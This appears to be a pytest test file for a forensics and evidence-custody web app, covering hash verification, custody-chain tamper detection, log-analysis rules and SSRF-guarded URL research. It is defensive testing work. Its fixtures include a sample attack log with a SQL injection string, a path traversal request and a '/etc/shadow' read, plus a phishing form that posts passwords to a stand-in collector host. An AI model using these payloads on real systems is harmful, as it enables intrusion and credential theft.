from collections.abc import Generator
from pathlib import Path

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine, select
from sqlalchemy.orm import Session, sessionmaker
from sqlalchemy.pool import StaticPool

from app.core.config import get_settings
from app.core.security import auth_rate_limiter
from app.db.base import Base
from app.db.session import get_db
from app.main import app
from app.models.evidence import CustodyEvent


@pytest.fixture
def client(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Generator[TestClient, None, None]:
    monkeypatch.setenv("EVIDENCE_VAULT_DIR", str(tmp_path / "vault"))
    get_settings.cache_clear()
    auth_rate_limiter.reset()

    engine = create_engine(
        "sqlite://",
        connect_args={"check_same_thread": False},
        poolclass=StaticPool,
    )
    Base.metadata.create_all(engine)
    test_session_factory = sessionmaker(bind=engine, autoflush=False, autocommit=False)

    def override_get_db() -> Generator[Session, None, None]:
        with test_session_factory() as session:
            yield session

    app.dependency_overrides[get_db] = override_get_db
    app.state.test_session_factory = test_session_factory
    with TestClient(app) as test_client:
        reg = test_client.post(
            "/api/v1/auth/register",
            json={
                "email": "forensics@cybertrace.test",
                "fullName": "Forensics Lead",
                "password": "StrongPassword123!",
                "organizationName": "Forensics Test Org",
            },
        )
        assert reg.status_code == 201, reg.text
        token = reg.json()["accessToken"]
        test_client.headers.update({"Authorization": f"Bearer {token}"})
        yield test_client
    app.dependency_overrides.clear()
    del app.state.test_session_factory
    Base.metadata.drop_all(engine)
    engine.dispose()
    get_settings.cache_clear()


def _create_case(client: TestClient, title: str = "SSH & Web Intrusion") -> dict:
    resp = client.post(
        "/api/v1/cases",
        json={"title": title, "severity": "CRITICAL", "assignedTo": "Investigator Maya"},
    )
    assert resp.status_code == 201, resp.text
    return resp.json()


SAMPLE_ATTACK_LOG = """\
2026-11-23T08:00:01Z sshd[101]: Failed password for admin from 203.0.113.45 port 55112 ssh2
2026-11-23T08:00:03Z sshd[102]: Failed password for admin from 203.0.113.45 port 55113 ssh2
2026-11-23T08:00:05Z sshd[103]: Failed password for admin from 203.0.113.45 port 55114 ssh2
2026-11-23T08:00:07Z sshd[104]: Failed password for admin from 203.0.113.45 port 55115 ssh2
2026-11-23T08:00:09Z sshd[105]: Failed password for admin from 203.0.113.45 port 55116 ssh2
2026-11-23T08:00:14Z sshd[106]: Accepted password for admin from 203.0.113.45 port 55118 ssh2
2026-11-23T08:01:02Z sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/cat /etc/shadow
198.51.100.77 - - [23/Nov/2026:08:02:10 +0000] "GET /login?user=admin' OR '1'='1 HTTP/1.1" 403 512
198.51.100.77 - - [23/Nov/2026:08:02:12 +0000] "GET /../../etc/passwd HTTP/1.1" 404 204
"""


def test_evidence_upload_verification_tamper_detection_and_custody(client: TestClient) -> None:
    case = _create_case(client)

    upload = client.post(
        "/api/v1/evidence/upload",
        data={
            "caseId": case["caseNumber"],
            "evidenceType": "LOG_FILE",
            "acquisitionSource": "bastion-01.corp",
            "collectedBy": "Investigator Maya",
            "description": "Captured SSH and web gateway log.",
        },
        files={"file": ("auth_attack.log", SAMPLE_ATTACK_LOG.encode("utf-8"), "text/plain")},
    )
    assert upload.status_code == 201, upload.text
    ev = upload.json()
    assert ev["evidenceCode"].startswith("EV-")
    assert len(ev["sha256"]) == 64
    assert len(ev["sha512"]) == 128
    assert len(ev["md5"]) == 32
    assert ev["latestVerification"]["sha256Matches"] is True
    assert ev["custodyChainValid"] is True

    # Re-verify untouched file on disk
    verify_ok = client.post(f"/api/v1/evidence/{ev['evidenceCode']}/verify")
    assert verify_ok.status_code == 200
    assert verify_ok.json()["sha256Matches"] is True
    assert verify_ok.json()["comparisonPerformed"] is True

    # Append custody transfer
    transfer = client.post(
        f"/api/v1/evidence/{ev['evidenceCode']}/custody",
        json={
            "action": "TRANSFERRED",
            "actor": "Investigator Maya",
            "fromCustodian": "Investigator Maya",
            "toCustodian": "Lab Analyst Omar",
            "location": "Forensics Lab B",
            "notes": "Handed over for deep log correlation.",
        },
    )
    assert transfer.status_code == 201, transfer.text
    assert len(transfer.json()["entryHash"]) == 64

    ledger = client.get("/api/v1/evidence/custody/ledger").json()
    assert ledger["allChainsValid"] is True
    assert ledger["totalEvents"] == 3  # COLLECTED, VERIFIED, TRANSFERRED

    # Simulate tampering with the file on disk -> verify must catch mismatch!
    vault_files = list(Path(get_settings().evidence_vault_dir).rglob("*auth_attack.log"))
    assert len(vault_files) == 1
    vault_files[0].write_text("TAMPERED BYTES", encoding="utf-8")

    verify_fail = client.post(f"/api/v1/evidence/{ev['evidenceCode']}/verify")
    assert verify_fail.status_code == 200
    assert verify_fail.json()["sha256Matches"] is False

    summary = client.get("/api/v1/evidence/integrity/summary").json()
    assert summary["mismatchCount"] == 1
    assert summary["verifiedCount"] == 0

    # Simulate tampering with a custody DB record -> ledger must flag broken chain!
    with app.state.test_session_factory() as session:
        first_event = session.scalars(select(CustodyEvent)).first()
        assert first_event is not None
        first_event.notes = "Altered retroactively"
        session.commit()

    broken_ledger = client.get("/api/v1/evidence/custody/ledger").json()
    assert broken_ledger["allChainsValid"] is False
    assert ev["evidenceCode"] in broken_ledger["brokenEvidenceCodes"]


def test_log_analysis_iocs_findings_timeline_dashboard_and_pdf_report(client: TestClient) -> None:
    case = _create_case(client)
    upload = client.post(
        "/api/v1/evidence/upload",
        data={"caseId": case["caseNumber"], "evidenceType": "LOG_FILE"},
        files={"file": ("gateway.log", SAMPLE_ATTACK_LOG.encode("utf-8"), "text/plain")},
    )
    assert upload.status_code == 201
    ev_code = upload.json()["evidenceCode"]

    # Run automated log analysis
    run = client.post(f"/api/v1/analysis/evidence/{ev_code}/analyze")
    assert run.status_code == 200, run.text
    result = run.json()
    assert result["eventsParsed"] == 9
    assert result["uniqueIocs"] >= 2
    assert result["findingsGenerated"] >= 3

    rule_ids = {f["ruleId"] for f in result["findings"]}
    assert "RULE_CREDENTIAL_COMPROMISE" in rule_ids
    assert "RULE_PRIVILEGE_ESCALATION" in rule_ids
    assert "RULE_WEB_SQL_INJECTION" in rule_ids or "RULE_WEB_PATH_TRAVERSAL" in rule_ids

    # Review a finding
    first_finding_id = result["findings"][0]["id"]
    reviewed = client.patch(
        f"/api/v1/analysis/findings/{first_finding_id}",
        json={"status": "CONFIRMED", "reviewerNotes": "Confirmed brute-force compromise on bastion."},
    )
    assert reviewed.status_code == 200
    assert reviewed.json()["status"] == "CONFIRMED"

    # Check IOCs & Unified Timeline
    iocs = client.get("/api/v1/analysis/iocs", params={"caseId": case["caseNumber"]}).json()
    assert any(item["value"] == "203.0.113.45" for item in iocs["items"])

    timeline = client.get("/api/v1/analysis/timeline", params={"caseId": case["caseNumber"]}).json()
    assert timeline["total"] >= 10
    assert any(item["recordType"] == "Analytical finding" for item in timeline["items"])

    # Check live Dashboard reflects real evidence, SHA-256 verification, auth distribution, and findings
    dashboard = client.get("/api/v1/dashboard/overview").json()
    assert dashboard["metrics"]["evidenceItems"]["value"] == 1
    assert dashboard["metrics"]["eventsAnalyzed"]["value"] >= 9
    assert len(dashboard["evidenceIntegrity"]["verificationChecks"]) == 1
    assert dashboard["evidenceIntegrity"]["verificationChecks"][0]["sha256Matches"] is True
    assert len(dashboard["analytics"]["authenticationDistribution"]) >= 2

    # Generate PDF & JSON reports
    pdf_resp = client.get(f"/api/v1/reports/cases/{case['caseNumber']}/pdf")
    assert pdf_resp.status_code == 200
    assert pdf_resp.headers["content-type"] == "application/pdf"
    assert pdf_resp.content.startswith(b"%PDF-")

    json_resp = client.get(f"/api/v1/reports/cases/{case['caseNumber']}/json")
    assert json_resp.status_code == 200
    assert json_resp.json()["summary"]["evidenceCount"] == 1
    assert json_resp.json()["summary"]["custodyChainsValid"] is True


def test_url_research_blocks_ssrf_and_researches_public_site(
    client: TestClient,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    case = _create_case(client, title="Reported Phishing Site")

    # 1. SSRF protection must block localhost / private targets
    blocked = client.post(
        "/api/v1/footprint/research",
        json={"url": "http://127.0.0.1:8000/health", "caseId": case["caseNumber"]},
    )
    assert blocked.status_code == 422

    # 2. Deterministic public site research with phishing cross-domain password form
    monkeypatch.setattr(
        "app.services.url_research.resolve_and_guard_dns",
        lambda host: {"hostname": host, "ipv4": ["93.184.216.34"], "ipv6": [], "reverseDns": {}},
    )
    monkeypatch.setattr(
        "app.services.url_research.inspect_tls_certificate",
        lambda host, port=443: {
            "available": True,
            "valid": True,
            "expired": False,
            "subjectCn": host,
            "issuerOrg": "Let's Encrypt",
            "issuerCn": "R3",
            "notBefore": "Nov 01 00:00:00 2026 GMT",
            "notAfter": "Feb 01 00:00:00 2027 GMT",
            "daysRemaining": 70,
            "sans": [host],
            "tlsVersion": "TLSv1.3",
            "cipher": "TLS_AES_256_GCM_SHA384",
        },
    )
    sample_html = (
        "<html><head><title>Portal Login</title></head>"
        "<body><form method='POST' action='https://evil-collector.example/steal'>"
        "<input type='password' name='pw'/></form>"
        "<a href='https://external-ref.example/docs'>Help</a></body></html>"
    )
    monkeypatch.setattr(
        "app.services.url_research.fetch_url_safely",
        lambda url: {
            "finalUrl": "https://portal-check.example/",
            "statusCode": 200,
            "elapsedMs": 120,
            "contentType": "text/html; charset=utf-8",
            "server": "nginx",
            "poweredBy": None,
            "redirectChain": [],
            "securityHeaders": {
                "strict-transport-security": {"present": False, "value": None},
                "content-security-policy": {"present": False, "value": None},
                "x-frame-options": {"present": False, "value": None},
                "x-content-type-options": {"present": False, "value": None},
                "referrer-policy": {"present": True, "value": "no-referrer"},
                "permissions-policy": {"present": False, "value": None},
            },
            "snapshotSha256": "a" * 64,
            "bodyText": sample_html,
            "bodySize": len(sample_html),
        },
    )

    resp = client.post(
        "/api/v1/footprint/research",
        json={
            "url": "https://portal-check.example/",
            "caseId": case["caseNumber"],
            "submittedBy": "Reporter Alex",
            "sealAsEvidence": True,
        },
    )
    assert resp.status_code == 201, resp.text
    data = resp.json()
    assert data["investigationCode"].startswith("FP-")
    assert data["domain"] == "portal-check.example"
    assert data["pageTitle"] == "Portal Login"
    assert data["riskScore"] >= 50
    assert data["riskLevel"] in ("HIGH", "CRITICAL")
    assert data["evidenceCode"] is not None and data["evidenceCode"].startswith("EV-")
    assert data["findingsCount"] >= 2

    # Verify history & detail endpoints
    history = client.get("/api/v1/footprint", params={"caseId": case["caseNumber"]}).json()
    assert history["total"] == 1
    detail = client.get(f"/api/v1/footprint/{data['investigationCode']}").json()
    assert detail["artifacts"]["forms"][0]["crossDomain"] is True
    assert detail["artifacts"]["forms"][0]["hasPasswordField"] is True
